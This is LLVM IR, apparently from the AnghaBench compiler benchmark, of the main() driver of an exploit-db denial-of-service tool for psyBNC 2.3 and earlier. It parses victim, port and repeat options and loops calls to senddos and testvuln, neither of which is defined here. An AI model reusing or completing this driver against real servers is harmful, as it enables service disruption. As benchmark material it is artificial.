; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_383.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_383.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [26 x i8] c"[+] ES psyBNC <= 2.3 DoS\0A\00", align 1
@.str.1 = private unnamed_addr constant [63 x i8] c"[+] Information System Advancement in Penetration (ISAP) Labs\0A\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c"[+] By: Lunar Fault [ElectronicSouls]\0A\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"d:n:p:s:u:hft\00", align 1
@EOF = common dso_local global i32 0, align 4
@force = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@SIZE = common dso_local global i32 0, align 4
@USER = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [16 x i8] c"[*] Victim: %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"[*] Port: %d\0A\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"[*] User: %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"[*] Size: %d\0A\00", align 1
@.str.8 = private unnamed_addr constant [15 x i8] c"[*] Times: %d\0A\00", align 1
@.str.9 = private unnamed_addr constant [31 x i8] c"[*] Testing for vulnerability\0A\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.11 = private unnamed_addr constant [26 x i8] c"[!] Failed to test Vuln!\0A\00", align 1
@.str.12 = private unnamed_addr constant [18 x i8] c"[*] Forceing DoS\0A\00", align 1
@.str.13 = private unnamed_addr constant [28 x i8] c"[!] Failed on sending DoS!\0A\00", align 1
@.str.14 = private unnamed_addr constant [24 x i8] c"[*] DoS sent %d times\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [1024 x i8], align 16
  %19 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0))
  %23 = load i32, i32* %4, align 4
  %24 = icmp slt i32 %23, 2
  br i1 %24, label %25, label %30

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @usage(i8* %28)
  br label %30

30:                                               ; preds = %25, %2
  br label %31

31:                                               ; preds = %69, %30
  %32 = load i32, i32* %4, align 4
  %33 = load i8**, i8*** %5, align 8
  %34 = call i32 @getopt(i32 %32, i8** %33, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  store i32 %34, i32* %6, align 4
  %35 = load i32, i32* @EOF, align 4
  %36 = icmp ne i32 %34, %35
  br i1 %36, label %37, label %70

37:                                               ; preds = %31
  %38 = load i32, i32* %6, align 4
  switch i32 %38, label %69 [
    i32 104, label %39
    i32 102, label %44
    i32 100, label %45
    i32 110, label %49
    i32 112, label %52
    i32 115, label %55
    i32 116, label %58
    i32 117, label %59
  ]

39:                                               ; preds = %37
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @usage(i8* %42)
  br label %69

44:                                               ; preds = %37
  store i32 1, i32* @force, align 4
  br label %69

45:                                               ; preds = %37
  %46 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %47 = load i32, i32* @optarg, align 4
  %48 = call i32 @strncpy(i8* %46, i32 %47, i32 1024)
  store i32 1, i32* %13, align 4
  br label %69

49:                                               ; preds = %37
  %50 = load i32, i32* @optarg, align 4
  %51 = call i32 @atoi(i32 %50)
  store i32 %51, i32* %11, align 4
  store i32 1, i32* %14, align 4
  br label %69

52:                                               ; preds = %37
  %53 = load i32, i32* @optarg, align 4
  %54 = call i32 @atoi(i32 %53)
  store i32 %54, i32* %9, align 4
  store i32 1, i32* %15, align 4
  br label %69

55:                                               ; preds = %37
  %56 = load i32, i32* @optarg, align 4
  %57 = call i32 @atoi(i32 %56)
  store i32 %57, i32* %10, align 4
  store i32 1, i32* %16, align 4
  br label %69

58:                                               ; preds = %37
  store i32 1, i32* %17, align 4
  br label %69

59:                                               ; preds = %37
  %60 = load i32, i32* @optarg, align 4
  %61 = call i32 @strlen(i32 %60)
  %62 = call i64 @malloc(i32 %61)
  %63 = inttoptr i64 %62 to i8*
  store i8* %63, i8** %19, align 8
  %64 = load i8*, i8** %19, align 8
  %65 = load i32, i32* @optarg, align 4
  %66 = load i32, i32* @optarg, align 4
  %67 = call i32 @strlen(i32 %66)
  %68 = call i32 @memcpy(i8* %64, i32 %65, i32 %67)
  store i32 1, i32* %12, align 4
  br label %69

69:                                               ; preds = %37, %59, %58, %55, %52, %49, %45, %44, %39
  br label %31

70:                                               ; preds = %31
  %71 = load i32, i32* %13, align 4
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %73, label %78

73:                                               ; preds = %70
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 0
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @usage(i8* %76)
  br label %78

78:                                               ; preds = %73, %70
  %79 = load i32, i32* %14, align 4
  %80 = icmp eq i32 %79, 0
  br i1 %80, label %81, label %82

81:                                               ; preds = %78
  store i32 3, i32* %11, align 4
  br label %82

82:                                               ; preds = %81, %78
  %83 = load i32, i32* %15, align 4
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %87

85:                                               ; preds = %82
  %86 = load i32, i32* @PORT, align 4
  store i32 %86, i32* %9, align 4
  br label %87

87:                                               ; preds = %85, %82
  %88 = load i32, i32* %16, align 4
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %92

90:                                               ; preds = %87
  %91 = load i32, i32* @SIZE, align 4
  store i32 %91, i32* %10, align 4
  br label %92

92:                                               ; preds = %90, %87
  %93 = load i32, i32* %12, align 4
  %94 = icmp eq i32 %93, 0
  br i1 %94, label %95, label %105

95:                                               ; preds = %92
  %96 = load i32, i32* @USER, align 4
  %97 = call i32 @strlen(i32 %96)
  %98 = call i64 @malloc(i32 %97)
  %99 = inttoptr i64 %98 to i8*
  store i8* %99, i8** %19, align 8
  %100 = load i8*, i8** %19, align 8
  %101 = load i32, i32* @USER, align 4
  %102 = load i32, i32* @USER, align 4
  %103 = call i32 @strlen(i32 %102)
  %104 = call i32 @memcpy(i8* %100, i32 %101, i32 %103)
  br label %105

105:                                              ; preds = %95, %92
  %106 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i8* %106)
  %108 = load i32, i32* %9, align 4
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0), i32 %108)
  %110 = load i8*, i8** %19, align 8
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0), i8* %110)
  %112 = load i32, i32* %10, align 4
  %113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0), i32 %112)
  %114 = load i32, i32* %11, align 4
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0), i32 %114)
  %116 = load i32, i32* %17, align 4
  %117 = icmp eq i32 %116, 1
  br i1 %117, label %118, label %130

118:                                              ; preds = %105
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.9, i64 0, i64 0))
  %120 = load i32, i32* %9, align 4
  %121 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %122 = call i32 @testvuln(i32 %120, i8* %121)
  store i32 %122, i32* %8, align 4
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  %124 = load i32, i32* %8, align 4
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %126, label %129

126:                                              ; preds = %118
  %127 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0))
  %128 = call i32 @exit(i32 1) #3
  unreachable

129:                                              ; preds = %118
  store i32 0, i32* %3, align 4
  br label %158

130:                                              ; preds = %105
  %131 = load i32, i32* @force, align 4
  %132 = icmp eq i32 %131, 1
  br i1 %132, label %133, label %135

133:                                              ; preds = %130
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.12, i64 0, i64 0))
  br label %135

135:                                              ; preds = %133, %130
  store i32 0, i32* %7, align 4
  br label %136

136:                                              ; preds = %152, %135
  %137 = load i32, i32* %7, align 4
  %138 = load i32, i32* %11, align 4
  %139 = icmp slt i32 %137, %138
  br i1 %139, label %140, label %155

140:                                              ; preds = %136
  %141 = load i32, i32* %9, align 4
  %142 = load i32, i32* %10, align 4
  %143 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %144 = load i8*, i8** %19, align 8
  %145 = call i32 @senddos(i32 %141, i32 %142, i8* %143, i8* %144)
  store i32 %145, i32* %8, align 4
  %146 = load i32, i32* %8, align 4
  %147 = icmp eq i32 %146, -1
  br i1 %147, label %148, label %151

148:                                              ; preds = %140
  %149 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.13, i64 0, i64 0))
  %150 = call i32 @exit(i32 1) #3
  unreachable

151:                                              ; preds = %140
  br label %152

152:                                              ; preds = %151
  %153 = load i32, i32* %7, align 4
  %154 = add nsw i32 %153, 1
  store i32 %154, i32* %7, align 4
  br label %136

155:                                              ; preds = %136
  %156 = load i32, i32* %11, align 4
  %157 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.14, i64 0, i64 0), i32 %156)
  store i32 0, i32* %3, align 4
  br label %158

158:                                              ; preds = %155, %129
  %159 = load i32, i32* %3, align 4
  ret i32 %159
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @strncpy(i8*, i32, i32) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @testvuln(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @senddos(i32, i32, i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
